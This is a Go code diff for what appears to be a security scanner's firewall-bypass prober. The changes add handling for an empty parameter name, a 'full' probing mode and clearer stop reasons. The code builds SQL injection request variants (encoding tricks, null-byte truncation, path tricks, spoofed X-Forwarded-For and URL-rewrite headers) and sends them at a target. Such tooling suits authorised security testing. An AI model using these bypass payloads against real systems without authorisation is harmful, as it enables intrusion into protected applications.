@@ -387,6 +387,11 @@ type BypassVariant struct {
 	Path     string
 	Headers  map[string]string
 	Body     string
+	// SkipReason marks a variant that cannot carry the payload as built. The
+	// only such case today is an empty parameter name: there is no place to
+	// attach the payload, so RunBypassProbes records it as "unsupported"
+	// instead of sending it under a made-up name.
+	SkipReason string
 }
 
 // BypassProbe is the outcome of one bypass attempt.
@@ -422,29 +427,63 @@ func BuildBypassVariants(path, param, payload string) []BypassVariant {
 	if payload == "" {
 		payload = "' union select 1,2,3--"
 	}
+	param = strings.TrimSpace(param)
 	enc := url.QueryEscape(payload)
-	base := path
-	if param != "" {
-		base = path + "?" + param + "=" + enc
+	// query attaches the payload under the parameter name. An empty name leaves
+	// nowhere to put it; the request shape is still enumerated for the record,
+	// but the caller must not send it (see SkipReason).
+	query := func(value string) string {
+		if param == "" {
+			return ""
+		}
+		return "?" + param + "=" + value
 	}
+	base := path + query(enc)
 	out := []BypassVariant{
 		{Name: "baseline", Desc: "原始请求", Category: "baseline", Method: http.MethodGet, Path: base},
 		{Name: "case", Desc: "参数大小写变形", Category: "encoding", Method: http.MethodGet, Path: swapCase(base)},
-		{Name: "urlencode", Desc: "单次 URL 编码", Category: "encoding", Method: http.MethodGet, Path: path + "?" + param + "=" + singleEncode(payload)},
-		{Name: "doubleencode", Desc: "双重 URL 编码", Category: "encoding", Method: http.MethodGet, Path: path + "?" + param + "=" + doubleEncode(payload)},
-		{Name: "unicode", Desc: "Unicode 百分号编码", Category: "encoding", Method: http.MethodGet, Path: path + "?" + param + "=" + unicodeEncode(payload)},
-		{Name: "nullbyte", Desc: "空字节截断", Category: "encoding", Method: http.MethodGet, Path: path + "?" + param + "=" + enc + "%00"},
-		{Name: "paramname", Desc: "参数名变形", Category: "path", Method: http.MethodGet, Path: path + "?" + param + "%20=" + enc},
-		{Name: "semicolon", Desc: "分号路径变形", Category: "path", Method: http.MethodGet, Path: "/;/" + strings.TrimPrefix(path, "/") + "?" + param + "=" + enc},
-		{Name: "doubleslash", Desc: "重复斜杠", Category: "path", Method: http.MethodGet, Path: "//" + strings.TrimPrefix(path, "/") + "?" + param + "=" + enc},
-		{Name: "trailslash", Desc: "追加尾斜杠", Category: "path", Method: http.MethodGet, Path: path + "/?" + param + "=" + enc},
-		{Name: "ext", Desc: "追加静态后缀", Category: "path", Method: http.MethodGet, Path: path + ".json?" + param + "=" + enc},
+		{Name: "urlencode", Desc: "单次 URL 编码", Category: "encoding", Method: http.MethodGet, Path: path + query(singleEncode(payload))},
+		{Name: "doubleencode", Desc: "双重 URL 编码", Category: "encoding", Method: http.MethodGet, Path: path + query(doubleEncode(payload))},
+		{Name: "unicode", Desc: "Unicode 百分号编码", Category: "encoding", Method: http.MethodGet, Path: path + query(unicodeEncode(payload))},
+		{Name: "nullbyte", Desc: "空字节截断", Category: "encoding", Method: http.MethodGet, Path: path + query(enc) + suffixWhenParam(param, "%00")},
+		{Name: "paramname", Desc: "参数名变形", Category: "path", Method: http.MethodGet, Path: path + paramNameQuery(param, enc)},
+		{Name: "semicolon", Desc: "分号路径变形", Category: "path", Method: http.MethodGet, Path: "/;/" + strings.TrimPrefix(path, "/") + query(enc)},
+		{Name: "doubleslash", Desc: "重复斜杠", Category: "path", Method: http.MethodGet, Path: "//" + strings.TrimPrefix(path, "/") + query(enc)},
+		{Name: "trailslash", Desc: "追加尾斜杠", Category: "path", Method: http.MethodGet, Path: path + "/" + query(enc)},
+		{Name: "ext", Desc: "追加静态后缀", Category: "path", Method: http.MethodGet, Path: path + ".json" + query(enc)},
 		{Name: "xff", Desc: "X-Forwarded-For 伪造", Category: "header", Method: http.MethodGet, Path: base, Headers: map[string]string{"X-Forwarded-For": "127.0.0.1"}},
-		{Name: "xoriginal", Desc: "X-Original-URL 头改写", Category: "header", Method: http.MethodGet, Path: path, Headers: map[string]string{"X-Original-URL": path + "?" + param + "=" + enc}},
-		{Name: "xrewrite", Desc: "X-Rewrite-URL 头改写", Category: "header", Method: http.MethodGet, Path: path, Headers: map[string]string{"X-Rewrite-URL": path + "?" + param + "=" + enc}},
+		{Name: "xoriginal", Desc: "X-Original-URL 头改写", Category: "header", Method: http.MethodGet, Path: path, Headers: map[string]string{"X-Original-URL": path + query(enc)}},
+		{Name: "xrewrite", Desc: "X-Rewrite-URL 头改写", Category: "header", Method: http.MethodGet, Path: path, Headers: map[string]string{"X-Rewrite-URL": path + query(enc)}},
 		{Name: "post", Desc: "改用 POST 提交", Category: "method", Method: http.MethodPost, Path: path, Body: param + "=" + enc, Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}},
 	}
+	if param == "" {
+		const reason = "参数名为空：载荷无处安放，未发起请求"
+		for i := range out {
+			if out[i].Name != "baseline" {
+				out[i].SkipReason = reason
+				out[i].Body = ""
+			}
+		}
+	}
 	return out
+}
+
+// suffixWhenParam appends a literal suffix only when a parameter name exists;
+// without one the variant is unsupported and must not look like a sent request.
+func suffixWhenParam(param, suffix string) string {
+	if param == "" {
+		return ""
+	}
+	return suffix
+}
+
+// paramNameQuery is the "parameter name deformation" query; without a name the
+// deformation itself is meaningless.
+func paramNameQuery(param, encoded string) string {
+	if param == "" {
+		return ""
+	}
+	return "?" + param + "%20=" + encoded
 }
 
 func swapCase(s string) string {
@@ -596,6 +635,19 @@ func reorderByFeature(order []BypassVariant, from int, feature BlockFeature) []B
 	return append(head, tail...)
 }
 
+// Bypass campaign modes.
+const (
+	// BypassModeAdaptive reorders the remaining variants by the inferred block
+	// feature after the first block and applies the consecutive-block stop-loss.
+	BypassModeAdaptive = "adaptive"
+	// BypassModeFull walks the variant list in build order until the budget runs
+	// out: no feature-aware reordering and no consecutive-block stop-loss, so
+	// every shape's blocked/passed outcome ends up on record. The first bypass
+	// still stops the campaign, and the consecutive-error stop-loss always
+	// applies (a dead target is not a bypass strategy signal).
+	BypassModeFull = "full"
+)
+
 // BypassConfig bounds how many requests RunBypassProbes will send.
 type BypassConfig struct {
 	// MaxAttempts is the cap on total requests, including the baseline. It is
@@ -605,6 +657,8 @@ type BypassConfig struct {
 	MaxConsecutiveBlocked int
 	// MaxConsecutiveErrors stops after this many transport errors in a row.
 	MaxConsecutiveErrors int
+	// Mode is BypassModeAdaptive (default) or BypassModeFull.
+	Mode string
 }
 
 // DefaultBypassConfig returns the production defaults.
@@ -613,6 +667,7 @@ func DefaultBypassConfig() BypassConfig {
 		MaxAttempts:           8,
 		MaxConsecutiveBlocked: 5,
 		MaxConsecutiveErrors:  3,
+		Mode:                  BypassModeAdaptive,
 	}
 }
 
@@ -632,6 +687,9 @@ func (c BypassConfig) clamp() BypassConfig {
 	if c.MaxConsecutiveErrors <= 0 {
 		c.MaxConsecutiveErrors = DefaultBypassConfig().MaxConsecutiveErrors
 	}
+	if c.Mode != BypassModeFull {
+		c.Mode = BypassModeAdaptive
+	}
 	return c
 }
 
@@ -648,18 +706,23 @@ type BypassRun struct {
 	// FinalVerdict is "bypassed" when any variant reached the target, else
 	// "no_bypass".
 	FinalVerdict string `json:"final_verdict"`
+	// Mode is the effective campaign mode (post-clamp), so the record shows
+	// which strategy produced the verdict.
+	Mode string `json:"mode"`
 	// Probes are the individual attempts, in send order.
 	Probes []BypassProbe `json:"probes"`
 }
 
 // RunBypassProbes sends variants against a protected endpoint. The baseline is
-// always first. Once a probe is blocked, the remaining variants are reordered by
-// the inferred block shape and the campaign stops on the first bypass, on budget
-// exhaustion, or on a consecutive-block / consecutive-error stop-loss. It never
+// always first. In adaptive mode (the default), once a probe is blocked the
+// remaining variants are reordered by the inferred block shape; the campaign
+// stops on the first bypass, on budget exhaustion, or on a consecutive-block /
+// consecutive-error stop-loss. Full mode keeps the build order and skips the
+// consecutive-block stop-loss so every shape's outcome is recorded. It never
 // loops unboundedly.
 func RunBypassProbes(ctx context.Context, c *DeepClient, baseURL string, variants []BypassVariant, keywords []string, cfg BypassConfig) BypassRun {
 	cfg = cfg.clamp()
-	run := BypassRun{}
+	run := BypassRun{Mode: cfg.Mode}
 	base := normalizeProbeURL(baseURL)
 	if len(variants) == 0 {
 		run.StopReason = "no_variants"
@@ -673,6 +736,8 @@ func RunBypassProbes(ctx context.Context, c *DeepClient, baseURL string, variant
 	consecutiveBlocked := 0
 	consecutiveErrors := 0
 	bypassed := false
+	sent := 0
+	unsupported := 0
 
 	for i := 0; i < len(order); i++ {
 		if run.Attempts >= cfg.MaxAttempts {
@@ -686,6 +751,19 @@ func RunBypassProbes(ctx context.Context, c *DeepClient, baseURL string, variant
 			break
 		}
 		v := order[i]
+		if v.SkipReason != "" {
+			unsupported++
+			probesAppend(&run, BypassProbe{
+				Name:     v.Name,
+				Desc:     v.Desc,
+				Category: v.Category,
+				Method:   v.Method,
+				Path:     v.Path,
+				Verdict:  "unsupported",
+				Note:     v.SkipReason,
+			})
+			continue
+		}
 		full := joinProbeURL(base, v.Path)
 		probe := BypassProbe{
 			Name:     v.Name,
@@ -697,6 +775,7 @@ func RunBypassProbes(ctx context.Context, c *DeepClient, baseURL string, variant
 		}
 		req := DeepRequest{Method: v.Method, URL: full, Headers: v.Headers, Body: v.Body, Timeout: 12 * time.Second}
 		resp := c.Do(ctx, req)
+		sent++
 		probe.ElapsedMs = resp.Elapsed.Milliseconds()
 
 		if resp.Error != "" {
@@ -724,7 +803,7 @@ func RunBypassProbes(ctx context.Context, c *DeepClient, baseURL string, variant
 			probe.Verdict = "blocked"
 			probe.Note = fmt.Sprintf("HTTP %d 被拦截", resp.StatusCode)
 			consecutiveBlocked++
-			if !reordered {
+			if !reordered && cfg.Mode != BypassModeFull {
 				feature = classifyBlockFeature(resp)
 				run.BlockFeature = feature.String()
 				order = reorderByFeature(order, i, feature)
@@ -745,7 +824,7 @@ func RunBypassProbes(ctx context.Context, c *DeepClient, baseURL string, variant
 			setLastStopReason(&run, run.StopReason)
 			break
 		}
-		if consecutiveBlocked >= cfg.MaxConsecutiveBlocked {
+		if cfg.Mode != BypassModeFull && consecutiveBlocked >= cfg.MaxConsecutiveBlocked {
 			run.StopReason = "consecutive_blocked"
 			setLastStopReason(&run, run.StopReason)
 			break
@@ -757,6 +836,11 @@ func RunBypassProbes(ctx context.Context, c *DeepClient, baseURL string, variant
 	}
 	if run.StopReason == "" {
 		run.StopReason = "completed"
+	}
+	// Every payload-bearing variant was skipped: only the untouched baseline
+	// went out. Say so, otherwise "completed" reads as "all shapes were tried".
+	if run.StopReason == "completed" && unsupported > 0 && sent <= 1 {
+		run.StopReason = "no_attack_variant"
 	}
 	if bypassed {
 		run.FinalVerdict = "bypassed"
